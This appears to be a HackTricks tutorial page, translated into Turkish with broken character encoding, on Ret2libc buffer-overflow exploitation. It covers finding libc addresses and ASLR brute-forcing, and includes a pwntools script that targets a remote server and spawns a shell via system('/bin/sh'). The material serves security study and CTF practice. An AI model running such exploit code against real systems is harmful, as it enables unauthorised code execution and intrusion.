# Ret2lib

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## **Temel Bilgiler**

**Ret2Libc**'in Ã¶zÃ¼, bir zayÄ±f programÄ±n yÃ¼rÃ¼tme akÄ±ÅŸÄ±nÄ±, saldÄ±rgan tarafÄ±ndan saÄŸlanan shellcode'u yÄ±ÄŸÄ±n Ã¼zerinde Ã§alÄ±ÅŸtÄ±rmak yerine, bir paylaÅŸÄ±lan kÃ¼tÃ¼phanedeki (Ã¶rneÄŸin, **system**, **execve**, **strcpy**) bir iÅŸleve yÃ¶nlendirmektir. SaldÄ±rgan, yÄ±ÄŸÄ±n Ã¼zerindeki dÃ¶nÃ¼ÅŸ adresini istenen kÃ¼tÃ¼phane iÅŸlevine iÅŸaret edecek ÅŸekilde deÄŸiÅŸtiren bir yÃ¼k oluÅŸturur ve Ã§aÄŸrÄ± konvansiyonuna gÃ¶re gerekli argÃ¼manlarÄ±n doÄŸru bir ÅŸekilde ayarlandÄ±ÄŸÄ±ndan emin olur.

### **Ã–rnek AdÄ±mlar (basitleÅŸtirilmiÅŸ)**

* Ã‡aÄŸrÄ±lacak iÅŸlevin adresini (Ã¶rneÄŸin, system) ve Ã§aÄŸrÄ±lacak komutu (Ã¶rneÄŸin, /bin/sh) alÄ±n
* Ä°lk argÃ¼manÄ± komut dizesine iÅŸaret edecek ÅŸekilde geÃ§mek ve yÃ¼rÃ¼tme akÄ±ÅŸÄ±nÄ± iÅŸleve yÃ¶nlendirmek iÃ§in bir ROP zinciri oluÅŸturun

## Adresleri Bulma

* KullanÄ±lan `libc`'nin mevcut makineden olduÄŸunu varsayarsak, bellekte nerede yÃ¼kleneceÄŸini bulmak iÃ§in: 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

EÄŸer ASLR'nin libc'nin adresini deÄŸiÅŸtirip deÄŸiÅŸtirmediÄŸini kontrol etmek istiyorsanÄ±z ÅŸunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* KullanÄ±lan libc'yi bilmek, `system` fonksiyonuna olan ofseti bulmayÄ± da mÃ¼mkÃ¼n kÄ±lar:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* KullanÄ±lan libc'yi bilmek, `/bin/sh` fonksiyonuna olan ofseti bulmayÄ± da mÃ¼mkÃ¼n kÄ±lar:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF KullanÄ±mÄ±

KullanÄ±lan libc'yi bilmek, **system** fonksiyonunun, **exit** fonksiyonunun ve **`/bin/sh`** dizesinin adresini almak iÃ§in Peda veya GEF kullanmayÄ± da mÃ¼mkÃ¼n kÄ±lar:
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps KullanÄ±mÄ±

EÄŸer sÃ¼reÃ§ her konuÅŸtuÄŸunuzda **Ã§ocuklar** oluÅŸturuyorsa (aÄŸ sunucusu) o dosyayÄ± **okumayÄ±** deneyin (muhtemelen root olmanÄ±z gerekecek).

Burada **libc'nin sÃ¼reÃ§ iÃ§inde tam olarak nerede yÃ¼klÃ¼ olduÄŸunu** ve **her Ã§ocuÄŸun sÃ¼reÃ§ iÃ§in nerede yÃ¼kleneceÄŸini** bulabilirsiniz.

![](<../../../.gitbook/assets/image (853).png>)

Bu durumda **0xb75dc000** adresinde yÃ¼klenmiÅŸtir (Bu libc'nin temel adresi olacaktÄ±r).

## Bilinmeyen libc

Bilinmeyen bir libc'nin yÃ¼kleniyor olabileceÄŸi durumlar olabilir (Ã§Ã¼nkÃ¼ eriÅŸiminiz olmayan bir sunucuda bulunabilir). Bu durumda, **bazÄ± adresleri sÄ±zdÄ±rmak ve hangi libc** kÃ¼tÃ¼phanesinin kullanÄ±ldÄ±ÄŸÄ±nÄ± bulmak iÃ§in aÃ§Ä±ÄŸÄ± kÃ¶tÃ¼ye kullanabilirsiniz:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Ve bunun iÃ§in bir pwntools ÅŸablonunu burada bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2 ofset ile libc'yi bilmek

[https://libc.blukat.me/](https://libc.blukat.me/) sayfasÄ±nÄ± kontrol edin ve libc iÃ§indeki **birkaÃ§ adres** kullanarak **kullanÄ±lan versiyonu** Ã¶ÄŸrenin.

## 32 bit'te ASLR'yi AÅŸmak

Bu kaba kuvvet saldÄ±rÄ±larÄ± **sadece 32 bit sistemler iÃ§in** faydalÄ±dÄ±r.

* EÄŸer istismar yerel ise, libc'nin temel adresini kaba kuvvetle bulmayÄ± deneyebilirsiniz (32 bit sistemler iÃ§in faydalÄ±dÄ±r):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Uzak bir sunucuya saldÄ±rÄ±yorsanÄ±z, **`usleep` `libc` fonksiyonunun adresini brute-force ile bulmayÄ±** deneyebilirsiniz, argÃ¼man olarak 10 (Ã¶rneÄŸin) geÃ§erek. EÄŸer bir noktada **sunucu yanÄ±t vermek iÃ§in 10 saniye ekstra alÄ±yorsa**, bu fonksiyonun adresini bulmuÅŸsunuzdur.

## One Gadget

libc'de **bir** belirli **adrese** atlayarak bir shell Ã§alÄ±ÅŸtÄ±rÄ±n:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Kod Ã–rneÄŸi

Bu Ã¶rnekte ASLR brute-force kodun iÃ§ine entegre edilmiÅŸtir ve savunmasÄ±z ikili bir uzak sunucuda bulunmaktadÄ±r:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kod Ã–rneÄŸi

Ã–rneÄŸi kontrol edin:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Ã–rneÄŸi

ARM64 durumunda, ret talimatÄ± x30 kaydÄ±nÄ±n iÅŸaret ettiÄŸi yere atlar, yÄ±ÄŸÄ±n kaydÄ±nÄ±n iÅŸaret ettiÄŸi yere deÄŸil. Bu nedenle biraz daha karmaÅŸÄ±k.

AyrÄ±ca ARM64'te bir talimat, talimatÄ±n yaptÄ±ÄŸÄ± ÅŸeyi yapar (talimatlarÄ±n ortasÄ±nda atlamak ve onlarÄ± yeni talimatlara dÃ¶nÃ¼ÅŸtÃ¼rmek mÃ¼mkÃ¼n deÄŸildir).

Ã–rneÄŸi kontrol edin:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (veya puts)

Bu, `printf`/`puts` Ã§aÄŸrÄ±sÄ± yaparak **iÅŸlemden bilgi sÄ±zdÄ±rmayÄ±** saÄŸlar; belirli verileri argÃ¼man olarak yerleÅŸtirerek. Ã–rneÄŸin, `puts`'un GOT'daki adresini `puts` Ã§aÄŸrÄ±sÄ±na koymak, **`puts`'un bellek adresini sÄ±zdÄ±rÄ±r**.

## Ret2printf

Bu, temelde bir **Ret2lib'i `printf` format dizeleri zafiyeti haline dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in kÃ¶tÃ¼ye kullanmak** anlamÄ±na gelir; `ret2lib` kullanarak printf'i istismar etmek iÃ§in deÄŸerlerle Ã§aÄŸÄ±rmak (gereksiz gibi gÃ¶rÃ¼nÃ¼yor ama mÃ¼mkÃ¼n):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## DiÄŸer Ã–rnekler ve referanslar

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, libc'deki bir iÅŸlevin adresine sÄ±zdÄ±rma verildiÄŸinde, bir gadget kullanarak
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR etkin ama PIE yok, ilk adÄ±m, puts'u Ã§aÄŸÄ±rmak ve sÄ±zdÄ±rmak iÃ§in kanaryanÄ±n 0x00 baytÄ±na kadar bir taÅŸmayÄ± doldurmaktÄ±r. Kanarya ile puts'un GOT'dan adresini sÄ±zdÄ±rmak iÃ§in bir ROP gadget'Ä± oluÅŸturulur ve ardÄ±ndan `system('/bin/sh')` Ã§aÄŸÄ±rmak iÃ§in bir ROP gadget'Ä±.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR etkin, kanarya yok, ana iÅŸlevden bir Ã§ocuk iÅŸlevde yÄ±ÄŸÄ±n taÅŸmasÄ±. Puts'un GOT'dan adresini sÄ±zdÄ±rmak iÃ§in puts'u Ã§aÄŸÄ±rmak iÃ§in bir ROP gadget'Ä± ve ardÄ±ndan bir gadget Ã§aÄŸÄ±rmak.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bit, pie yok, kanarya yok, relro yok, nx. Yazma iÅŸlevini kullanarak yazmanÄ±n (libc) adresini sÄ±zdÄ±rÄ±r ve bir gadget Ã§aÄŸÄ±rÄ±r.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* YÄ±ÄŸÄ±nlardan kanaryayÄ± sÄ±zdÄ±rmak iÃ§in bir format dizesi kullanÄ±r ve `/bin/sh` adresi ile sisteme Ã§aÄŸrÄ±da bulunmak iÃ§in bir tampon taÅŸmasÄ± kullanÄ±r (GOT'dadÄ±r).
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, relro yok, kanarya yok, nx, pie. YÄ±ÄŸÄ±nlardan libc ve heap adreslerini sÄ±zdÄ±rmak iÃ§in kÃ¶tÃ¼ bir indeksleme kullanÄ±r. Bir tampon taÅŸmasÄ±nÄ± kÃ¶tÃ¼ye kullanarak `system('/bin/sh')` Ã§aÄŸÄ±ran bir ret2lib yapar (bir kontrolÃ¼ atlamak iÃ§in heap adresi gereklidir).

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.**

</details>
{% endhint %}
